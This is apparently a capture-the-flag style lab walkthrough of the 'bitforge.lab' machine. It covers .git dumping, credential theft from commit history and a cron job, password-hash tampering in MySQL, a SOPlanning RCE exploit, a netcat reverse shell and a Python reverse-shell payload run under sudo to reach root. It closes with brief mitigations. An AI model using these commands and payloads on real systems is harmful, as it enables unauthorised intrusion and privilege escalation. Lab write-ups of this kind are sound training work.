## Introduction

In this walkthrough, I worked on an intermediate-level Linux machine. Port 80 was open, and while exploring it, I discovered a virtual host running the *Simple Online Planning Tool v1.52.01*, which is vulnerable to authenticated remote code execution. I also found a `.git` directory on the base domain and cloned it locally. By inspecting the commit history, I retrieved database credentials. I then modified the password hash in the database to a known default, allowing me to log in and exploit the RCE vulnerability.

Post-exploitation, I enumerated running processes and found one leaking plaintext credentials, which I used for lateral movement. Finally, I identified that I could execute a Python reverse shell using `sudo`, which allowed me to escalate privileges and gain root access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

### Port 3306

Version - MySQL 8.0.40-0ubuntu0.24.04.1

Without valid credentials nothing we can do for now.

## Web

### Port 80

Add domain to `/etc/hosts` file.

## Exploitation

Going to `plan.bitforge.lab` that I found in main website I see the software and its version and found an exploit for it:

[SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/52082)

But first we should be able to authenticate.

**Gobuster Scan on bitforge.lab**

```bash
gobuster dir -u http://bitforge.lab/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

I found out that login page on `bitforge.lab` does not work at all it does not send any requests.

We have `.git` that means it is a bare repo let’s clone it to our local directory  using tool such as `git-dumper`.

I found just `index.php` and `login.php` pages here.

![image.png](image%203.png)

Checking the status with `git status` , and `git log` I see commits.

![image.png](image%204.png)

First one is about creating `index.php` and `login.php` pages.

In the second commit I see database connection credentails:

![image.png](image%205.png)

Nothing interesting found in others.

I connected to the database using these credentials:

```bash
mysql -u BitForgeAdmin -h $IP -p --ssl=0
```

Found that bitforge_customer_db database is empty, so I checked `soplanning` and found SHA1 hash of admin user. I tried cracking it using hashcat and 100 mode but couldn’t crack it.

```bash
hashcat -m 100 admin.hash /usr/share/wordlists/rockyou.txt
```

That’s why I thought of changing password here using MySQL `UPDATE` clause:

```bash
UPDATE planning_user SET password='5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' where login='admin';
```

![image.png](image%206.png)

But still I couldn’t login, maybe application has its own hashing method rather than hashing password directly to SHA1, that’s why I decided to change the hash to original default one that comes with soplanning application in that case we will remove probability of hash format being wrong.

I found database default hash here [soplanning/includes/demo_data.inc](https://github.com/Worteks/soplanning/blob/master/includes/demo_data.inc)

Then changed it database:

```bash
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' where login='admin';
```

After that I entered `admin`:`admin`, and get in. Previous is confirmed also with the way that I tried to crack this hash but Hashcat exhausted with `rockyou.txt`.

I tried to execute the exploit but it failed then I noticed that it tried to access `/process/upload.php` page which does not exist on main page but rather under `www`.

```bash
python3 52082.py -t http://plan.bitforge.lab/www -u admin -p admin
```

![image.png](image%207.png)

Now we are in.

let’s get a shell using netcat and then make it interactive with python.

```bash
busybox nc 192.168.45.159 80 -e /bin/bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Lateral Movement to Jack

- **OSCP Checklist**
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [x]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo

    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    

Running `pspy64` to see running processes I immediately noticed `mysqldump` usage by jack and cleartext credentials:

```bash
timeout 3m ./psp64
```

It looks like a cronjob running in every 2 minutes:

![image.png](image%209.png)

```bash
/bin/sh -c mysqldump -u jack -p'j4cKF0rg3@445' soplanning >> /opt/backup/soplanning_dump.log 2>&1 

mysqldump -u jack -pj4cKF0rg3@445 soplanning
```

## Privilege Escalation

Checking for `sudo` I see:

![image.png](image%2010.png)

```bash
#!/bin/bash
cd /opt/password_change_app 
/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug
```

Even though `cd` is not in absolute path we cannot abuse it by `PATH Hijacking` because most likely `/etc/sudoers` file uses `secure_path`.

I got interested and forwarded port 9000 making it possible to view from attacker machine using `chisel`:

```bash
./chisel_1.10.1_linux_amd64 server --reverse --port 3306 -v
./chisel_1.10.1_linux_amd64 client 192.168.45.159:3306 R:9000:127.0.0.1:9000
```

![image.png](image%2011.png)

Here what I see, fuzzing for directories doesn’t reveal anything either.

I understand that it executes the code written in `app.py` file:

```bash
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")
```

which creates an `index.html` file that we see when accessing from browser and it is saved under `templates` directory.

![image.png](image%2012.png)

I am gonna change the contents of `app.py` to reverse shell and run it with sudo:

```python
import socket
import os
import pty

RHOST = "192.168.45.159"
RPORT = 3306

s = socket.socket()
s.connect((RHOST, RPORT))

# Duplicate socket file descriptor to stdin, stdout, and stderr
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

# Spawn a shell
pty.spawn("/bin/sh")

```

After executing the command I got a root shell. (I used port that is open on the target other ports might be blocked)

## Credentials

```bash
BitForgeAdmin : B1tForG3S0ftw4r3S0lutions -> Database creds

jack : j4cKF0rg3@445
```

## Mitigation

- Remove sensitive directories like `.git` from public-facing environments.
- Regularly rotate and encrypt credentials used in applications and processes.
- Patch known vulnerabilities in third-party tools such as SOPTool.
- Enforce the principle of least privilege for user and process permissions.
- Use sudo restrictions and audit logs to monitor and limit high-privileged command execution.
